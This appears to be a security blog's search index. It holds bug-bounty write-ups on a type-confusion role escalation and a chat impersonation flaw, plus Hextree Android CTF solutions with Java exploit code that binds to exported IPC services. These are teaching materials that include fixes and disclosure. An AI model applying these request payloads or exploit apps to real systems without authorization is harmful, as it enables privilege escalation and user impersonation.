vulnerable.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#example-in-javascript","title":"Example in JavaScript:","text":"<pre><code>let role = \"1\";\nif (role == 1) {\n    console.log(\"Access granted\");\n} else {\n    console.log(\"Access denied\");\n}\n````\n\nEven though `role` is a string (`\"1\"`), JavaScript's loose equality operator `==` coerces it into an integer (`1`), causing unintended access.\n\nCorrect way (strict type check):\n\n```js\nif (role === 1) {\n    console.log(\"Access granted\");\n} else {\n    console.log(\"Access denied\");\n}\n</code></pre>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#the-discovery-a-tale-of-two-data-types","title":"The Discovery: A Tale of Two Data Types","text":"<p>It all started with a routine inspection of an invitation system's API. My goal? To see how roles were assigned during user invitations.</p> <p>The <code>role_id</code> parameter caught my attention. It was an array, and at first glance, it seemed well-restricted.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#available-frontend-roles","title":"Available frontend roles:","text":"<ul> <li><code>3</code> \u2013 Admin</li> <li><code>4</code> \u2013 Manager</li> <li><code>5</code> \u2013 User</li> </ul> <p>Trying a non-existing role like <code>2</code>:</p> <pre><code>400 Bad Request\n</code></pre> <p>Then I sent this request:</p> <pre><code>POST /target/sms/v1/379831/invitation HTTP/2\nHost: api.stg.target.com\nContent-Type: application/json\nAuth: Bearer &lt;valid_token&gt;\n\n{\n  \"org_id\": [379831],\n  \"role_id\": [1],\n  \"user\": {\"email\": \"testuser@example.com\"},\n  \"invitation_authentication_type\": [\"cred\"],\n  \"is_new\": false\n}\n</code></pre> <p>Response:</p> <p><pre><code>403 Forbidden\n</code></pre> </p> <p>This caught my eye \u2013 <code>403</code> means access denied, but the role exists.</p> <p>If <code>1</code> were completely invalid, I would expect a <code>400 Bad Request</code> like I saw with <code>2</code>.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#the-bypass-when-1-100000","title":"The Bypass: When <code>1</code> \u2260 <code>1.00000</code>","text":"<p>I slightly changed the payload:</p> <pre><code>{\n  \"role_id\": [1.00000]\n}\n</code></pre> <p>The response:</p> <pre><code>200 OK\n</code></pre> <p></p> <p>And shortly after\u2026 An invitation email confirming my System Administrator role arrived.</p> <p>This was it. I had admin privileges over an entire organization!</p> <p></p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#why-did-this-happen","title":"Why Did This Happen?","text":"<p>The backend probably enforced strict checks on integers like <code>1</code>, but when presented with <code>1.00000</code>, it might\u2019ve coerced the value into a float or different representation that bypassed validation logic.</p> <p>This is Type Confusion in action.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#how-it-happens-in-different-languages","title":"How It Happens in Different Languages:","text":"<ul> <li>JavaScript: <code>1 == \"1\"</code> \u2192 <code>true</code></li> <li>Python: <code>int(1.00000) == 1</code> \u2192 <code>true</code></li> <li>C++: Improper casting can lead to memory corruption</li> </ul>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#the-potential-impact","title":"The Potential Impact","text":"<p>If this flaw were fully exploitable, attackers could:</p> <ul> <li>Escalate privileges to System Administrator</li> <li>Assign admin roles to unauthorized users</li> <li>Gain unrestricted access to internal data</li> </ul> <p>A small oversight, massive implications.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#how-to-fix-it","title":"How to Fix It","text":"<ul> <li>Strict Type Validation: Enforce correct types on backend.</li> <li>Input Normalization: Sanitize &amp; convert inputs before using them.</li> <li>Authorization Checks: Don\u2019t rely on just value types \u2014 check if the user has permission to assign roles.</li> </ul>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly/#epilogue-the-reality-of-bug-bounties","title":"Epilogue: The Reality of Bug Bounties","text":"<p>The report was acknowledged but closed as a duplicate.</p> <p>Disappointing? Sure. But also a reminder: even tiny data inconsistencies can lead to serious vulnerabilities.</p> <p>For every closed report, there's another undiscovered flaw waiting to be found.</p> <p>Until next time, stay curious, stay ethical, and keep hacking.</p>","tags":["Type Confusion","Privilege Escalation","Security","Bug Bounty","CTF","Vulnerabilities","Real-World Stories"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/","title":"Privilege Escalation via Chat Permissions Bypass","text":"<p>Sometimes, what seems like a minor UI restriction hides a deeper flaw \u2014 one that lets you step into someone else's shoes.</p> <p>In this case, I discovered a privilege escalation issue in a platform\u2019s internal messaging system that relied too heavily on UI-level permission enforcement. Here's the story.</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#the-discovery","title":"\ud83e\udded The Discovery","text":"<p>While exploring the messaging functionality of a platform, I noticed that even after a user\u2019s \"Inbox\" permission was revoked via the UI, API requests to send messages were still succeeding.</p> <p>The frontend was hiding the feature, but the backend wasn't blocking access.</p> <p>Naturally, I dug deeper.</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#what-i-tried","title":"\ud83d\udd01 What I Tried","text":"<p>I created two test users and performed a basic exchange of messages between them. Then, I intentionally disabled messaging for one of the users via the platform\u2019s settings.</p> <p>After intercepting the API request for sending a message and replaying it using a tool like Repeater, the message still went through \u2014 even though, from the UI, the user was clearly blocked.</p> <p>\ud83d\uddbc\ufe0f Insert screenshot or video of message being sent after permission removal</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#it-gets-worse-impersonation","title":"\ud83d\udc64 It Gets Worse: Impersonation","text":"<p>At this point, I asked myself: What if I try to send a message pretending to be someone else?</p> <p>After experimenting with user IDs in the request body, it became clear that the system allowed arbitrary <code>user_id</code> values \u2014 meaning I could send a message as another user, without any ownership of their session.</p> <p>This effectively allowed impersonation inside the internal chat system.</p> <p>\ud83d\uddbc\ufe0f Insert screenshot or video showing message from forged identity</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#impact-summary","title":"\ud83c\udfaf Impact Summary","text":"<ul> <li>Sending messages without \"Inbox\" permission</li> <li>Sending messages as another user using only their ID</li> <li>Bypassing client-side restrictions entirely</li> <li>No backend validation for sender identity</li> </ul> <p>This kind of flaw could be used to impersonate internal users, trick recipients, or trigger automated actions linked to specific users.</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#responsible-disclosure-response","title":"\ud83d\udcec Responsible Disclosure &amp; Response","text":"<p>I responsibly reported the issue through hackerone. The team acknowledged the finding and confirmed that the UI-level permissions were never meant to enforce true access control.</p> <p>However, the impersonation aspect was unexpected, and they treated it seriously.</p> <p>\"Our engineering team has released a fix for the user impersonation issue...\"</p> <p>The issue was resolved after internal investigation and patching.</p> <p></p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/privilege-escalation-via-chat-permissions-bypass/#final-thoughts","title":"\ud83d\udcad Final Thoughts","text":"<p>This was a great example of why client-side restrictions \u2260 security. Relying solely on frontend visibility or toggles is dangerous if backend validation is missing.</p> <p>It's always worth looking at the actual requests the browser makes \u2014 not just what the UI lets you see.</p> <p>Thanks for reading! If you have thoughts, ideas, or want to chat, feel free to reach out on X (Twitter).</p>","tags":["privilege-escalation","access-control","api-security","bug-bounty"]},{"location":"writeups/android/","title":"Android","text":"Hextree Course Lab Solutions Published: 2025-06-16 <p>Articles about Hextree Course Lab Solutions</p>"},{"location":"writeups/android/hextree-labs-solutions/","title":"Hextree Lab Solutions","text":"Flag28Service AIDL Binding Walkthrough (Hextree Lab) 3 minute read Published: 2025-06-15 <p>A step-by-step guide to reverse engineering and exploiting an exported Android AIDL-based bound Service from another app.</p> Hextree Labs - Flag27Service Messenger Vulnerability (Solution) 3 minute read Published: 2025-06-14 <p>A short write-up on exploiting an Android Service vulnerability involving Messenger IPC and state management to retrieve a hidden flag.</p> Exploiting Flag26Service \u2013 Android Messenger-Based Service (Hextree CTF) 3 minute read Published: 2025-06-09 <p>Exploiting an Android Messenger-based service in a CTF app to capture a flag by triggering internal activity.</p>","tags":["Android","CTF","Hextree","Services","IPC","Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/","title":"Exploiting Flag26Service \u2013 Android Messenger-Based Service (Hextree CTF)","text":"","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#challenge-overview","title":"\ud83d\udd0d Challenge Overview","text":"<p>We're given a bound <code>Service</code> called <code>Flag26Service</code>, which exposes a <code>Messenger</code> IPC interface using <code>onBind()</code>:</p> <pre><code>@Override\npublic IBinder onBind(Intent intent) {\n    return this.messenger.getBinder();\n}\n````\n\nThe service uses a `Handler` to process incoming messages. When it receives a message with `what == 42`, it triggers this function:\n\n```java\nprivate void success(String str) {\n    Intent intent = new Intent(this, Flag26Activity.class);\n    intent.putExtra(\"secret\", secret);\n    intent.putExtra(\"what\", 42);\n    intent.addFlags(268468224);\n    intent.putExtra(\"hideIntent\", true);\n    startActivity(intent);\n}\n</code></pre> <p>This launches the activity containing the flag, passing the secret and flag trigger values via the <code>Intent</code>.</p>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#the-catch","title":"\ud83d\udea7 The Catch","text":"<p>Even if you successfully bind to the service and send <code>Message.what == 42</code>, <code>Flag26Activity</code> is not exported:</p> <pre><code>&lt;activity\n    android:name=\"io.hextree.attacksurface.activities.Flag26Activity\"\n    android:exported=\"false\"/&gt;\n</code></pre> <p>This means the activity cannot be launched from your external app unless the target app is already in the foreground or running in the background.</p>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#solution-steps","title":"\u2705 Solution Steps","text":"","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#1-create-a-separate-app","title":"1. Create a separate app","text":"<p>This is your attack app.</p>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#2-bind-to-the-service","title":"2. Bind to the service","text":"<p>Use <code>Context.BIND_AUTO_CREATE</code> to connect to the exported <code>Flag26Service</code>.</p> <pre><code>Intent intent = new Intent();\nintent.setClassName(\"io.hextree.attacksurface\", \"io.hextree.attacksurface.services.Flag26Service\");\nbindService(intent, connection, Context.BIND_AUTO_CREATE);\n</code></pre>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#3-send-the-trigger-message","title":"3. Send the trigger message","text":"<p>Use a <code>Messenger</code> to send a message with <code>what == 42</code>.</p> <pre><code>Message msg = Message.obtain(null, 42);\nserviceMessenger.send(msg);\n</code></pre>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#4-bring-the-app-to-the-foreground","title":"4. Bring the app to the foreground","text":"<p>Since <code>Flag26Activity</code> is not exported, the service won\u2019t launch it unless the app is running in the foreground.</p> <p>\u2705 Workaround: After pressing the attack button, manually open the target app (<code>io.hextree.attacksurface</code>) to bring it to the foreground. This will allow <code>startActivity(intent)</code> inside the service to succeed.</p>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag26/#flag-retrieval","title":"\ud83c\udfc1 Flag Retrieval","text":"<p>Once the activity is launched, it checks if the passed <code>secret</code> matches the static <code>Flag26Service.secret</code>, and shows the flag if so:</p> <pre><code>if (Flag26Service.secret.equals(stringExtra)) {\n    success(this);\n}\n</code></pre> <p>\u2705 The flag is displayed inside <code>Flag26Activity</code> UI or logged using the internal <code>LogHelper</code> class.</p> <p>Thanks for reading \ud83d\ude4c</p>","tags":["Android","IPC","Messenger","Android CTF","Hextree","Android Services","App Security"]},{"location":"writeups/android/hextree-labs-solutions/Flag27/","title":"Hextree Labs \u2013 Flag27Service Messenger Vulnerability (Solution)","text":""},{"location":"writeups/android/hextree-labs-solutions/Flag27/#introduction","title":"Introduction","text":"<p>This write-up covers the solution for the <code>Flag27Service</code> challenge from Hextree Labs. This challenge highlights a common Android Inter-Process Communication (IPC) vulnerability when services handle messages via <code>Messenger</code> and maintain state. The goal was to extract a hidden flag by interacting with the service in a specific sequence.</p>"},{"location":"writeups/android/hextree-labs-solutions/Flag27/#understanding-the-target-flag27service","title":"Understanding the Target (<code>Flag27Service</code>)","text":"<p>The <code>Flag27Service</code> exposes a <code>Messenger</code> for IPC. Our analysis of its <code>IncomingHandler</code> revealed three key message types:</p> <ul> <li><code>MSG_ECHO (what = 1)</code>: Allows setting an <code>echo</code> string within the service.</li> <li><code>MSG_GET_PASSWORD (what = 2)</code>: Generates a UUID, stores it internally, and replies with it.</li> <li><code>MSG_GET_FLAG (what = 3)</code>: Requires:</li> <li><code>echo</code> must be <code>\"give flag\"</code>.</li> <li><code>password</code> must match the previously generated one.</li> </ul> <p>If both conditions are met, the service launches <code>Flag27Activity</code> with the flag.</p>"},{"location":"writeups/android/hextree-labs-solutions/Flag27/#the-vulnerability-stateful-handler-and-messageobj-check","title":"The Vulnerability: Stateful Handler and <code>message.obj</code> Check","text":"<p>The <code>IncomingHandler</code> maintains internal state (<code>echo</code>, <code>password</code>). The <code>MSG_GET_PASSWORD</code> handler includes:</p> <pre><code>if (message.obj == null) {\n    Flag27Service.this.sendReply(message, \"Error\");\n    return;\n}\n// proceed to generate and send password\n````\n\nSo if `obj` is `null`, no password is sent. This check is key to bypassing.\n\n## Exploitation Strategy\n\n### Step 1 \u2013 Set the `echo` string\n\nSend `MSG_ECHO` with `\"give flag\"` to prep the state.\n\n### Step 2 \u2013 Get the password\n\nSend `MSG_GET_PASSWORD` with a **non-null `obj`** (e.g., an empty `Bundle`) to bypass the null-check.\n\n### Step 3 \u2013 Get the flag\n\nSend `MSG_GET_FLAG` with the captured password inside a `Bundle`.\n\n## The Exploit Code (`HextreeActivity.java`)\n\nThe following Android activity binds to `Flag27Service` and performs the 3-step exploit:\n\n```java\n// Full code omitted for brevity \u2013 see original version above for details\n// Handles service connection, sending messages, and receiving replies\n</code></pre> <p>Key logic:</p> <ul> <li>Set <code>\"give flag\"</code> using <code>MSG_ECHO</code>.</li> <li>Get password via <code>MSG_GET_PASSWORD</code> (with <code>obj = new Bundle()</code>).</li> <li>Immediately send <code>MSG_GET_FLAG</code> with the password.</li> </ul>"},{"location":"writeups/android/hextree-labs-solutions/Flag27/#execution-and-results","title":"Execution and Results","text":"<ol> <li>Install target app: <code>io.hextree.attacksurface</code>.</li> <li>Install exploit app: <code>com.example.hexatree</code>.</li> <li>Launch <code>HextreeActivity</code> and tap \"Attack\".</li> <li> <p>Logcat shows:</p> </li> <li> <p>MSG 1 \u2192 <code>echo</code> set.</p> </li> <li>MSG 2 \u2192 password received.</li> <li>MSG 3 \u2192 flag request sent.</li> <li>Success response logged.</li> <li>Flag27Activity appears, revealing the flag.</li> </ol>"},{"location":"writeups/android/hextree-labs-solutions/Flag27/#conclusion","title":"Conclusion","text":"<p>This challenge demonstrates how vulnerable stateful IPC services can be. Validating message structure (like <code>obj</code>) and avoiding persistent state in bound services are crucial steps to securing Android components.</p>"},{"location":"writeups/android/hextree-labs-solutions/Flag28/","title":"Flag28Service AIDL Binding Walkthrough (Hextree Lab)","text":"","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#lab-objective","title":"\ud83d\udccc Lab Objective","text":"<p>The goal of this Hextree challenge is to interact with an exported bound Android service (<code>Flag28Service</code>) from a different app (our attacking app) by leveraging AIDL (Android Interface Definition Language). Once the AIDL interface is properly bound and invoked, a flag activity is launched containing a secret UUID.</p>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#reconnaissance","title":"\ud83d\udd0d Reconnaissance","text":"<p>Inspecting the AndroidManifest of the target app, we find this service:</p> <pre><code>&lt;service\n    android:name=\"io.hextree.attacksurface.services.Flag28Service\"\n    android:enabled=\"true\"\n    android:exported=\"true\"/&gt;\n````\n\n\u2705 The `android:exported=\"true\"` line means any app on the device can bind to this service \u2014 if it knows how.\n\n---\n\n## \ud83e\udde0 Understanding the Service Code\n\nHere\u2019s what `Flag28Service.java` does:\n\n```java\npublic class Flag28Service extends Service {\n    public static String secret = UUID.randomUUID().toString();\n    private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() {\n        @Override\n        public boolean openFlag() throws RemoteException {\n            return success();\n        }\n\n        public boolean success() {\n            Intent intent = new Intent();\n            intent.setClass(Flag28Service.this, Flag28Activity.class);\n            intent.putExtra(\"secret\", Flag28Service.secret);\n            intent.addFlags(268468224);\n            intent.putExtra(\"hideIntent\", true);\n            Flag28Service.this.startActivity(intent);\n            return true;\n        }\n    };\n\n    @Override\n    public IBinder onBind(Intent intent) {\n        Log.i(\"Flag28Service\", Utils.dumpIntent(this, intent));\n        return this.binder;\n    }\n}\n</code></pre> <ul> <li>When <code>openFlag()</code> is called, it launches <code>Flag28Activity</code> with the <code>secret</code> in the intent.</li> <li>That function is exposed via AIDL.</li> </ul>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#step-by-step-exploit-via-aidl","title":"\ud83d\udd27 Step-by-Step Exploit via AIDL","text":"","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#1-get-the-aidl-definition","title":"1. \ud83d\udd0e Get the AIDL Definition","text":"<p>From decompiled code, we extract the AIDL interface:</p> <pre><code>package io.hextree.attacksurface.services;\n\ninterface IFlag28Interface {\n    boolean openFlag();\n}\n</code></pre> <p>Create this file in your client app:</p> <pre><code>app/src/main/aidl/io/hextree/attacksurface/services/IFlag28Interface.aidl\n</code></pre> <p>\ud83d\udcda AIDL Documentation</p> <p>Then rebuild the project. This will generate a stub interface your app can use to call the service.</p>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#2-create-a-client-app-to-bind-to-the-service","title":"2. \ud83c\udfd7\ufe0f Create a Client App to Bind to the Service","text":"<p>No special permission is needed to bind to exported services.</p>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#hextreeactivityjava","title":"<code>HextreeActivity.java</code>","text":"<pre><code>public class HextreeActivity extends AppCompatActivity {\n    boolean isBound = false;\n    IFlag28Interface remoteservice;\n\n    ServiceConnection connection = new ServiceConnection() {\n        public void onServiceConnected(ComponentName name, IBinder service) {\n            remoteservice = IFlag28Interface.Stub.asInterface(service);\n            isBound = true;\n            sendMessageToService();\n        }\n\n        public void onServiceDisconnected(ComponentName name) {\n            isBound = false;\n            remoteservice = null;\n        }\n    };\n\n    public void sendMessageToService() {\n        if (!isBound) return;\n        try {\n            remoteservice.openFlag();\n        } catch (RemoteException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        Button attackButton = findViewById(R.id.attack);\n        attackButton.setOnClickListener(v -&gt; {\n            Intent intent = new Intent();\n            intent.setClassName(\"io.hextree.attacksurface\", \"io.hextree.attacksurface.services.Flag28Service\");\n            bindService(intent, connection, Context.BIND_AUTO_CREATE);\n        });\n    }\n\n    @Override\n    protected void onDestroy() {\n        if (isBound) {\n            unbindService(connection);\n            isBound = false;\n        }\n        super.onDestroy();\n    }\n}\n</code></pre>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#layout-activity_mainxml","title":"Layout: <code>activity_main.xml</code>","text":"<pre><code>&lt;Button\n    android:id=\"@+id/attack\"\n    android:layout_width=\"wrap_content\"\n    android:layout_height=\"wrap_content\"\n    android:text=\"Launch Flag Service\" /&gt;\n</code></pre>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#testing-the-attack","title":"\ud83e\uddea Testing the Attack","text":"<ol> <li>Install the vulnerable target app.</li> <li>Install and run your client app.</li> <li>Tap the button \u2192 it binds to the service.</li> <li>Calls <code>openFlag()</code> \u2192 starts <code>Flag28Activity</code> with the flag.</li> </ol> <p>\ud83c\udf89 You now have access to the secret UUID stored statically in the service.</p>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#why-this-works","title":"\ud83d\udd10 Why This Works","text":"<ul> <li>AIDL enables IPC in Android. If a service is exported and implements an AIDL interface, any app can use it \u2014 as long as it has the correct <code>.aidl</code> definition.</li> <li>The Binder framework ensures capability-based access, so possession of the IBinder gives you the power to call the methods.</li> </ul>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#resources","title":"\ud83d\udcda Resources","text":"<ul> <li>Android AIDL Guide</li> <li>Binder Internals (Google)</li> <li>Binder IPC Deep Dive</li> <li>Hextree CTF Labs \u2013 Android IPC + Reverse Engineering Challenges</li> </ul>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#notes-for-real-world-testing","title":"\ud83e\udde0 Notes for Real-World Testing","text":"<ul> <li>Always check for <code>exported=true</code> in the target app's <code>AndroidManifest.xml</code>.</li> <li>Decompile APKs using tools like jadx or apktool to extract <code>.aidl</code> files.</li> <li>Verify if the service performs security checks (e.g., caller package, signature).</li> </ul>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]},{"location":"writeups/android/hextree-labs-solutions/Flag28/#summary","title":"\u2705 Summary","text":"<p>This lab demonstrates how exported AIDL-based services can become attack surfaces. By reverse engineering the <code>.aidl</code>, replicating it, and binding from your own app, you can trigger privileged flows like opening hidden activities or leaking secrets \u2014 all by using Binder IPC correctly.</p> <p>The power of Android IPC becomes a vulnerability when misconfigured.</p>","tags":["android","aidl","binder","reverse engineering","inter-process communication","hextree","penetration testing","android security"]}]}